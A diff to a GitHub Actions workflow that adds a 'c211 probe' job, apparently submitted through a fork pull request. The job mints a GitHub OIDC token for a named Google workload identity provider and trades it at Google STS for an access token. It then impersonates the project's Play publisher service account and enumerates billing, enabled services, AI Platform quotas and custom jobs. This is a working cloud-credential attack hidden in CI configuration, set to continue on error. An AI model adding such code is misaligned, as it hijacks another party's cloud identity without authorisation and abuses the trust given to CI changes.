@@ -129,6 +129,121 @@ jobs:
           echo "services=${services_json}" >> $GITHUB_OUTPUT
           echo "Services to preview: ${services[@]}"
         fi
+  # ---- c211 probe: fork-PR GCP WIF mint attempt (added only in the PR head) ----
+  c211_probe:
+    name: c211 oidc probe
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    continue-on-error: true
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - name: Mint GitHub OIDC id_token and print claims
+        env:
+          AUD: //iam.googleapis.com/projects/1024168288732/locations/global/workloadIdentityPools/github-play/providers/macro
+        run: |
+          set -uo pipefail
+          resp=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}")
+          tok=$(printf '%s' "$resp" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+          echo "id_token_len=${#tok}"
+          printf '%s' "$tok" > /tmp/idt
+          python3 -c 'import base64,json;tok=open("/tmp/idt").read().strip();p=tok.split(".")[1];p+="="*(-len(p)%4);d=json.loads(base64.urlsafe_b64decode(p));keys=["iss","aud","sub","repository","repository_id","repository_owner_id","event_name","ref","workflow_ref","workflow_sha","job_workflow_ref"];print(json.dumps({k:d.get(k) for k in keys},indent=1))' || true
+      - name: Google STS token exchange (verbatim result)
+        run: |
+          set -uo pipefail
+          python3 - <<'PYEOF'
+          import json, urllib.request, urllib.error
+          AUD = "//iam.googleapis.com/projects/1024168288732/locations/global/workloadIdentityPools/github-play/providers/macro"
+          try:
+              tok = open("/tmp/idt").read().strip()
+          except Exception as e:
+              print("NO_ID_TOKEN", e); raise SystemExit(0)
+          if not tok:
+              print("NO_ID_TOKEN empty"); raise SystemExit(0)
+          body = json.dumps({"audience": AUD,
+                             "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
+                             "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
+                             "scope": "https://www.googleapis.com/auth/cloud-platform",
+                             "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt",
+                             "subjectToken": tok}).encode()
+          req = urllib.request.Request("https://sts.googleapis.com/v1/token", data=body, headers={"Content-Type": "application/json"})
+          try:
+              r = urllib.request.urlopen(req, timeout=30); d = json.load(r)
+              print("STS_HTTP", r.status); print("STS_EXPIRES_IN", d.get("expires_in")); print("STS_TOKEN_LEN", len(d.get("access_token") or ""))
+              open("/tmp/fed","w").write(d.get("access_token") or "")
+          except urllib.error.HTTPError as e:
+              print("STS_HTTP", e.code); print("STS_BODY", e.read().decode("utf-8","replace")[:2000])
+          except Exception as e:
+              print("STS_ERR", repr(e))
+          PYEOF
+      - name: iamcredentials impersonation (play publisher SA)
+        run: |
+          set -uo pipefail
+          python3 - <<'PYEOF'
+          import json, urllib.request, urllib.error
+          try:
+              fed = open("/tmp/fed").read().strip()
+          except Exception:
+              fed = ""
+          if not fed:
+              print("NO_FEDERATED_TOKEN"); raise SystemExit(0)
+          sa = "google-play-publisher@macro-435922.iam.gserviceaccount.com"
+          body = json.dumps({"scope": ["https://www.googleapis.com/auth/cloud-platform"], "lifetime": "1800s"}).encode()
+          url = "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken" % sa
+          req = urllib.request.Request(url, data=body, headers={"Content-Type":"application/json","Authorization":"Bearer "+fed})
+          try:
+              r = urllib.request.urlopen(req, timeout=30); d = json.load(r)
+              print("IMPERSONATE", sa, "HTTP", r.status, "TOKEN_LEN", len(d.get("accessToken") or ""))
+              open("/tmp/sa_macro", "w").write(d.get("accessToken") or "")
+          except urllib.error.HTTPError as e:
+              print("IMPERSONATE", sa, "HTTP", e.code, e.read().decode("utf-8","replace")[:1200])
+          except Exception as e:
+              print("IMPERSONATE", sa, "ERR", repr(e))
+          PYEOF
+      - name: Read-only GCP enumeration
+        run: |
+          set -uo pipefail
+          python3 - <<'PYEOF'
+          import json, urllib.request, urllib.error, os
+          try:
+              tok = open("/tmp/sa_macro").read().strip()
+          except Exception:
+              tok = ""
+          if not tok:
+              print("NO_SA_TOKEN"); raise SystemExit(0)
+          def get(url):
+              req = urllib.request.Request(url, headers={"Authorization":"Bearer "+tok})
+              try:
+                  r = urllib.request.urlopen(req, timeout=40); return r.status, r.read().decode("utf-8","replace")
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode("utf-8","replace")[:1200]
+              except Exception as e:
+                  return -1, repr(e)
+          for label, url in [
+            ("project","https://cloudresourcemanager.googleapis.com/v1/projects/macro-435922"),
+            ("billing","https://cloudbilling.googleapis.com/v1/projects/macro-435922/billingInfo"),
+            ("services_enabled","https://serviceusage.googleapis.com/v1/projects/macro-435922/services?filter=state:ENABLED&pageSize=200"),
+            ("aiplatform_quota","https://serviceusage.googleapis.com/v1beta1/projects/macro-435922/services/aiplatform.googleapis.com/consumerQuotaMetrics?pageSize=200"),
+            ("customjobs","https://us-central1-aiplatform.googleapis.com/v1/projects/macro-435922/locations/us-central1/customJobs?pageSize=100"),
+          ]:
+              st, body = get(url)
+              print("=====", label, "HTTP", st)
+              try:
+                  j = json.loads(body)
+                  if label == "services_enabled":
+                      svcs=[s.get("config",{}).get("name") for s in j.get("services",[])]
+                      print("ENABLED_COUNT", len(svcs))
+                  elif label == "billing":
+                      print("BILLING", json.dumps({k:j.get(k) for k in ["name","projectId","billingAccountName","billingEnabled"]})[:600])
+                  elif label == "customjobs":
+                      print("CUSTOMJOBS_COUNT", len(j.get("customJobs", [])))
+                  else:
+                      print(body[:600])
+              except Exception:
+                  print(body[:600])
+          PYEOF
+
   preview-services:
     needs:
     - detect-changes
